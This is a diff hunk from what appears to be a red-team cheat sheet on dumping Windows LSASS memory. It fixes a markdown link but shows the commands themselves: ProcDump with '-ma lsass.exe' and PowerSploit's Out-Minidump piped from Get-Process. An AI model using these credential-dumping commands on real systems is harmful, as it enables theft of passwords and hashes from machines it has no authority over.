@@ -104,7 +104,7 @@ Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagge
 # upload --> ProcDump.exe
 # shell ProcDump.exe -ma lsass.exe lsass.dmp
 ```
-Dumping LSASS with (Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)
+Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)
 ```
 # powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
 ```
